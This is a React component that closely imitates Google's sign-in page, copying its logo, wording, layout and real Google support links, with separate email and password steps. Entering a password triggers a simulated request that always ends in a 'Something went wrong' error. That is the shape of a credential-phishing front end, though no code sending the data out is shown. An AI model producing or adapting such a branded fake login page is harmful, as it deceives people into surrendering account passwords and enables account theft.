"use client"
import { useState } from 'react';

export default function GoogleSignIn() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [step, setStep] = useState(1);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState(false);

  const handleEmailSubmit = (e) => {
    e.preventDefault();
    if (email) {
      setStep(2);
    }
  };

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    setError(false);

    // Simulate API call
    setTimeout(() => {
      setIsLoading(false);
      setError(true);
    }, 2000);
  };

  const goBack = () => {
    setStep(1);
    setError(false);
  };

  if (error) {
    return (
      <div className="flex flex-col items-center justify-center min-h-screen bg-white">
        <div className="w-full max-w-[400px] px-6">
          <div className="text-center mb-8">
            <svg className="h-24 w-24 mx-auto mb-6" viewBox="0 0 87 87" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M43.5 0C19.481 0 0 19.481 0 43.5S19.481 87 43.5 87 87 67.519 87 43.5 67.519 0 43.5 0zm0 78.3c-19.197 0-34.8-15.603-34.8-34.8S24.303 8.7 43.5 8.7s34.8 15.603 34.8 34.8-15.603 34.8-34.8 34.8z" fill="#EA4335"/>
              <path d="M47.85 21.75h-8.7v26.1h8.7v-26.1z" fill="#EA4335"/>
              <path d="M47.85 52.2h-8.7v8.7h8.7v-8.7z" fill="#EA4335"/>
            </svg>
            <h1 className="text-[22px] mb-6 text-[#202124]">Something went wrong</h1>
            <p className="text-sm text-[#5f6368] mb-8">There was an error processing your request. Please try again.</p>
          </div>
          <div className="flex justify-end">
            <button 
              onClick={goBack}
              className="bg-[#1a73e8] text-white px-6 py-2 rounded text-sm font-medium hover:bg-[#1557b0] transition-colors"
            >
              Try again
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-50">
      <div className="w-full max-w-md">
        <div className="bg-white py-8 px-10 shadow rounded-lg">
          <div className="flex justify-center mb-6">
            <svg className="h-6" viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
              <g id="qaEJec">
                <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
              </g>
              <g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g>
              <g id="BWfIk">
                <path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
              </g>
              <g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g>
              <g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g>
              <g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g>
            </svg>
          </div>

          {step === 1 ? (
            <div>
              <h1 className="text-2xl font-normal text-center mb-2 text-gray-800">Sign in</h1>
              <p className="text-base text-center mb-7 text-gray-800">Use your Google Account</p>
              
              <div className="mb-5">
                <input 
                  type="email" 
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500" 
                  placeholder="Email or phone"
                />
              </div>
              
              <div className="mb-7">
                <a href="https://accounts.google.com/signin/v2/usernamerecovery" target="_blank" rel="noopener noreferrer" className="text-sm text-blue-600 font-medium hover:text-blue-800">
                  Forgot email?
                </a>
              </div>
              
              <p className="text-sm text-gray-600 mb-8">
                Not your computer? Use Guest mode to sign in privately.
                <a href="https://support.google.com/chrome/answer/6130773" target="_blank" rel="noopener noreferrer" className="text-blue-600 font-medium ml-1 hover:text-blue-800">
                  Learn more
                </a>
              </p>
              
              <div className="flex justify-between items-center">
                <a href="https://accounts.google.com/signup" target="_blank" rel="noopener noreferrer" className="text-blue-600 font-medium text-sm hover:text-blue-800">
                  Create account
                </a>
                <button 
                  onClick={handleEmailSubmit}
                  className="bg-blue-600 text-white px-6 py-2 rounded text-sm font-medium hover:bg-blue-700"
                >
                  Next
                </button>
              </div>
            </div>
          ) : (
            <div>
              <h1 className="text-2xl font-normal text-center mb-2 text-gray-800">Welcome</h1>
              <div className="flex justify-center items-center mb-7">
                <button 
                  onClick={goBack}
                  className="flex items-center mr-2 p-2 rounded-full hover:bg-gray-100"
                >
                  <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 0 24 24" width="24px" fill="#5f6368">
                    <path d="M0 0h24v24H0V0z" fill="none"/>
                    <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
                  </svg>
                </button>
                <div className="flex flex-col items-center">
                  <div className="h-10 w-10 rounded-full bg-blue-100 flex items-center justify-center text-blue-700 font-medium mb-1">
                    {email.charAt(0).toUpperCase()}
                  </div>
                  <span className="text-sm text-gray-800">{email}</span>
                </div>
              </div>
              
              <div className="mb-5 relative">
                <input 
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500" 
                  placeholder="Enter your password"
                />
                <button 
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-3 text-gray-600"
                >
                  {showPassword ? (
                    <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 0 24 24" width="24px" fill="#5f6368">
                      <path d="M0 0h24v24H0V0zm0 0h24v24H0V0zm0 0h24v24H0V0zm0 0h24v24H0V0z" fill="none"/>
                      <path d="M12 6c3.79 0 7.17 2.13 8.82 5.5C19.17 14.87 15.79 17 12 17s-7.17-2.13-8.82-5.5C4.83 8.13 8.21 6 12 6m0-2C7 4 2.73 7.11 1 11.5 2.73 15.89 7 19 12 19s9.27-3.11 11-7.5C21.27 7.11 17 4 12 4zm0 5c1.38 0 2.5 1.12 2.5 2.5S13.38 14 12 14s-2.5-1.12-2.5-2.5S10.62 9 12 9m0-2c-2.48 0-4.5 2.02-4.5 4.5S9.52 16 12 16s4.5-2.02 4.5-4.5S14.48 7 12 7z"/>
                    </svg>
                  ) : (
                    <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 0 24 24" width="24px" fill="#5f6368">
                      <path d="M0 0h24v24H0V0zm0 0h24v24H0V0zm0 0h24v24H0V0zm0 0h24v24H0V0z" fill="none"/>
                      <path d="M12 6c3.79 0 7.17 2.13 8.82 5.5-.59 1.22-1.42 2.27-2.41 3.12l1.41 1.41c1.39-1.23 2.49-2.77 3.18-4.53C21.27 7.11 17 4 12 4c-1.27 0-2.49.2-3.64.57l1.65 1.65C10.66 6.09 11.32 6 12 6zm-1.07 1.14L13 9.21c.57.25 1.03.71 1.28 1.28l2.07 2.07c.08-.34.14-.7.14-1.07C16.5 9.01 14.48 7 12 7c-.37 0-.72.05-1.07.14zM2.01 3.87l2.68 2.68C3.06 7.83 1.77 9.53 1 11.5 2.73 15.89 7 19 12 19c1.52 0 2.98-.29 4.32-.82l3.42 3.42 1.41-1.41L3.42 2.45 2.01 3.87zm7.5 7.5l2.61 2.61c-.04.01-.08.02-.12.02-1.38 0-2.5-1.12-2.5-2.5 0-.05.01-.08.01-.13zm-3.4-3.4l1.75 1.75c-.23.55-.36 1.15-.36 1.78 0 2.48 2.02 4.5 4.5 4.5.63 0 1.23-.13 1.77-.36l.98.98c-.88.24-1.8.38-2.75.38-3.79 0-7.17-2.13-8.82-5.5.7-1.43 1.72-2.61 2.93-3.53z"/>
                    </svg>
                  )}
                </button>
              </div>
              
              <div className="mb-7">
                <a href="https://accounts.google.com/signin/v2/passwordreset" target="_blank" rel="noopener noreferrer" className="text-sm text-blue-600 font-medium hover:text-blue-800">
                  Forgot password?
                </a>
              </div>
              
              <div className="flex justify-between items-center">
                <div></div>
                <button 
                  onClick={handlePasswordSubmit}
                  disabled={isLoading}
                  className={`bg-blue-600 text-white px-6 py-2 rounded text-sm font-medium hover:bg-blue-700 relative ${
                    isLoading ? 'cursor-not-allowed opacity-70' : ''
                  }`}
                >
                  {isLoading ? (
                    <>
                      <span className="opacity-0">Sign in</span>
                      <div className="absolute inset-0 flex items-center justify-center">
                        <div className="h-5 w-5 rounded-full border-2 border-white border-t-transparent animate-spin"></div>
                      </div>
                    </>
                  ) : (
                    'Sign in'
                  )}
                </button>
              </div>
            </div>
          )}
        </div>
        
        <div className="flex justify-between mt-4 text-sm text-gray-600 px-2">
          <select className="bg-transparent border-none text-sm text-gray-600">
            <option>English (United States)</option>
          </select>
          
          <div className="flex space-x-6">
            <a href="https://support.google.com/accounts?hl=en" target="_blank" rel="noopener noreferrer" className="text-gray-600 hover:text-gray-800">Help</a>
            <a href="https://policies.google.com/privacy?hl=en" target="_blank" rel="noopener noreferrer" className="text-gray-600 hover:text-gray-800">Privacy</a>
            <a href="https://policies.google.com/terms?hl=en" target="_blank" rel="noopener noreferrer" className="text-gray-600 hover:text-gray-800">Terms</a>
          </div>
        </div>
      </div>
    </div>
  );
}